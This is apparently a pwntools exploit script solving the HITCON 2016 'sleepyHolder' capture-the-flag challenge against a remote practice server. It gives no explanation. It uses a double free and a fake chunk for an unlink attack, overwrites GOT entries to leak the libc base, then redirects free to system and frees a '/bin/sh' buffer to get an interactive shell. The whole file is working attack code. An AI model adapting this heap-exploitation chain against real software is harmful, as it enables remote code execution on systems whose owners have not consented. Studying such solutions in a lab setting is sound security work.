from pwn import *

context.log_level = 'debug'

# p = process("./sleepyHolder_hitcon_2016")
p = remote('node3.buuoj.cn',25181)
elf = ELF("./sleepyHolder_hitcon_2016")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(index, content):
    p.recvuntil("Renew secret\n")
    p.sendline("1")
    p.recvuntil("\n")
    p.sendline(str(index))
    p.recvuntil("secret: \n")
    p.send(content)

def delete(index):
    p.recvuntil("3. Renew secret\n")
    p.sendline("2")
    p.recvuntil("Big secret\n")
    p.send(str(index))

def update(index, content):
    p.recvuntil("Renew secret\n")
    p.sendline("3")
    p.recvuntil("Big secret\n")
    p.sendline(str(index))
    p.recvuntil("secret: \n")
    p.send(content)

# Double Free
add(1, 'aaa')
add(2, 'bbb')
delete(1)
add(3, 'ccc')
delete(1)

#Fake Chunk
f_ptr = 0x6020d0
s_ptr = 0x6020c0

fake_chunk  = p64(0) + p64(0x21)
fake_chunk += p64(0x6020d0-0x18) + p64(0x6020d0-0x10)
fake_chunk += p64(0x20)
add(1, fake_chunk)
delete(2)

#gdb.attach(p)
#leak libc base
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
system_offset = libc.symbols['system']
atoi_offset = libc.symbols['atoi']

#gdb.attach(p)
content = p64(0) + p64(atoi_got)
content += p64(puts_got) + p64(free_got) + p32(0x1)*3
update(1, content)
update(1, p64(puts_plt))
#update

delete(2)
libc_base = u64(p.recvn(6).ljust(8, "\x00")) - atoi_offset
system = libc_base + system_offset

update(1, p64(system))
add(2, "/bin/sh\x00")
delete(2)
p.interactive()